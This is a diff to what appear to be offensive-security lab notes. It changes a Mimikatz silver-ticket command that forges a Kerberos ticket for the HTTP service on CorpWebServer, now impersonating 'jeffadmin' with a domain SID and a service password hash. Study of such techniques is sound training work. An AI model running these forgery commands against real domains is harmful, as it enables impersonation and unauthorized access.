@@ -398,7 +398,7 @@ klist
 ```
 whoami /user
 kerberos::purge
-kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668(domain SID part from whoami /user) /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327(password hash of iis_service) /ptt
+kerberos::golden /user:jeffadmin(impersonated user) /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668(domain SID part from whoami /user) /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327(password hash of iis_service) /ptt
 kerberos::list
 ```
 ```
